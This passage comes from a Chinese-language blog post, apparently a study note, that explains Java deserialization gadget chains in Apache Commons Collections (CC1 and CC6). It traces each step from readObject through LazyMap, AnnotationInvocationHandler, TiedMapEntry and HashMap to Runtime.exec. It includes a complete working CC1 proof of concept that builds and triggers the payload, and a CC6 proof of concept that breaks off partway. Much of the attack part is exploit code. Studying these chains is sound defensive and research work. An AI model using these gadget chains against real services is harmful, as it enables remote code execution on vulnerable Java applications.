class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>现在我们将上面三个类串起来，举个执行命令的简单例子，创建一个<code>Transformer</code>数组，将Runtime对象传入<code>ConstantTransformer</code>作为第一个元素，通过<code>InvokerTransformer</code>调用<code>Runtime</code>实例的<code>exec</code>方法放在第二个元素，然后将<code>Transformer</code>数组传入<code>ChainedTransformer</code>构造方法，最后调用其<code>transform</code>方法就可以触发命令。</p><img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220305230623599.png" class="" title="image-20220305230623599"><p>其实<code>chainedTransformer</code>调用过程和<code>object.xxx().yyy().zzz()</code>是一样的，进一步将上面<code>Runtime.getRuntime()</code>改为反射的写法</p><p>为什么Runtime.getRuntime()需要进一步修改为反射的写法？</p><blockquote><p>Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。而我们最早传给ConstantTransformer的是Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化。</p><p> Runtime.getRuntime() 换成了 Runtime.class ，前者是一个java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="number">0</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformer);</span><br><span class="line">chainedTransformer.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>其实等价于<code>Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null,null).exec(&quot;calc&quot;)</code>，现在我们可以通过<code>chainedTransformer</code>的<code>transform</code>方法到命令执行了，那么如何从<code>readObject</code>到<code>transform</code>函数呢？这就是<code>CommonsCollections</code>链的意义了</p><h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>上面我们是手写触发<code>chainedTransformer</code>的<code>transform</code>方法，一般不会有代码直接写<code>chainedTransformer.transform(null)</code>，所以我们需要找到更加常用且有调用<code>transform</code>的方法，LazyMap正好符合要求，看下LazyMap的关键源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>LazyMap的<code>decorate</code>方法会将传入的<code>Transformer</code>保存为<code>factory</code>，当从<code>map</code>中不包含get的key时，会触发<code>factory</code>的<code>transform</code>方法。</p><p>所以我们将一个空的map和执行命令的<code>chainedTransforme</code>传入LazyMap的<code>decorate</code>，再调用该LazyMap的<code>get</code>方法（key为任意）即可触发<code>transform</code></p><img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220306190610425.png" class="" title="image-20220306190610425"><p>接着进一步寻找实现了<code>readObject</code>，并且通过<code>readObject</code>能触发到LazyMap的<code>get</code>方法，这样就可以构成一个反序列化利用链了。AnnotationInvocationHandler类正好可以满足这样的要求。</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>先看下AnnotationInvocationHandler类（JDK8的版本要&lt;1.8.0_71）关键的几个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;  <span class="comment">// 保存传进来的Map实例</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();  <span class="comment">// 如果设置了动态代理，这里会先调用memberValues的invoke方法</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                Object var6 = <span class="keyword">this</span>.memberValues.get(var4);  <span class="comment">// 这里触发get方法</span></span><br><span class="line">                ......</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中的<code>invoke</code>方法会调用到<code>memberValues</code>的<code>get</code>方法，而<code>memberValues</code>可通过构造函数赋值为LazyMap，所以能调用到<code>Invoke</code>就可以触发，要怎么通过<code>readObject</code>方法调用到<code>invoke</code>方法呢？可以通过java对象代理。</p><p>java提供了<code>newProxyInstance</code>创建对象代理的方式：<code>newProxyInstance(ClassLoader loader,  Class&lt;?&gt;[] interfaces, InvocationHandler h)</code>，第1个参数是<code>ClassLoader</code>，默认即可；第2个参数是我们需要代理的对象集合；第3个参数为实现了<code>InvocationHandler</code>接口的实例，里面包含了具体代理的逻<br>辑，<code>AnnotationInvocationHandler</code>类正好实现了<code>InvocationHandler</code>和<code>Serializable</code>接口，可以作为第3个参数。</p><p>被对象代理设置的对象，调用其任意方法时，都会先调用代理类，也就是<code>InvocationHandler</code>实例的<code>invoke</code>方法。</p><p>上方代码<code>readObject</code>方法的第23行，在传入的<code>this.memberValues</code>有设置对象代理时，调用其任意方法都会触发其代理类的<code>invoke</code>方法，代理类可以设置<code>AnnotationInvocationHandler</code>，在<code>invoke</code>中就可以触发<code>get</code>方法了，这样我们打通了整个利用链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** ysoserial的Gadget chain</span></span><br><span class="line"><span class="comment">      ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">         AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">            Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">               AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">                  LazyMap.get()</span></span><br><span class="line"><span class="comment">                     ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Class.getMethod()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                           Method.invoke()</span></span><br><span class="line"><span class="comment">                              Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>cc1完整poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="number">0</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将一条空的fakeTransformers传给ChainedTransformer，避免本地调试时触发命令</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span></span><br><span class="line">                ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取构造函数</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理类</span></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);</span><br><span class="line">        <span class="comment">// 动态代理，创建lazyMap实例</span></span><br><span class="line">        Map map1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);</span><br><span class="line">        <span class="comment">// 创建被反序列化的AnnotationInvocationHandler类</span></span><br><span class="line">        Object aa = constructor.newInstance(Override.class, map1);</span><br><span class="line">        <span class="comment">// 序列化前再将真正触发命令的transformers设置进去</span></span><br><span class="line">        Field iTransformers = ChainedTransformer.class.getDeclaredField((<span class="string">&quot;iTransformers&quot;</span>));</span><br><span class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(aa);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray()));</span><br><span class="line">        Object o = in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220320225339874.png" class="" title="image-20220320225339874"><h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>上面CC1只有在jdk版本低于1.8.0_71才能触发，因为新版本<code>AnnotationInvocationHandler#readObject</code>逻辑变了。我们要解决jdk高版本利用的问题，其实就是要寻找其他调用<code>LazyMap#get()</code>的地方，<code>TideMapEntry#hashCode</code>方法正好有调用。</p><h3 id="TideMapEntry"><a href="#TideMapEntry" class="headerlink" title="TideMapEntry"></a>TideMapEntry</h3><p>先看下TideMapEntry的几个关键方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过构造方法将LazyMap传入<code>this.map</code>，然后通过<code>getValue</code>方法可以触发其<code>get</code>方法，而<code>hashCode</code>又有调用到<code>getValue</code>，所以我们需要继续找一个类，该类的<code>readObject</code>可以通到<code>TideMapEntry#hashCode</code>。</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ......</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);  <span class="comment">// 调用hash方法</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>HashMap的<code>readObject</code>会调用<code>hash</code>方法，hash方法内触发<code>key</code>的<code>hashCode</code>，如果我们<code>key</code>传入<code>TideMapEntry</code>，就可以触发<code>TideMapEntry#hashCode</code>了，其实到这里从<code>readObject</code>到<code>transform</code>就走通了，算是一个简化版的CC6链，Ysoserial中CC6在此基础上加了层<code>HashSet#readObject</code>。</p><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p><code>HashSet#readObject</code>会调用HashMap的<code>put</code>方法，正好可以跟上面链接起来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HashMap#put</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><p>CC6利用链和poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Gadget chain:</span></span><br><span class="line"><span class="comment">       java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="number">0</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span></span><br><span class="line">                ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tiedMapEntry = 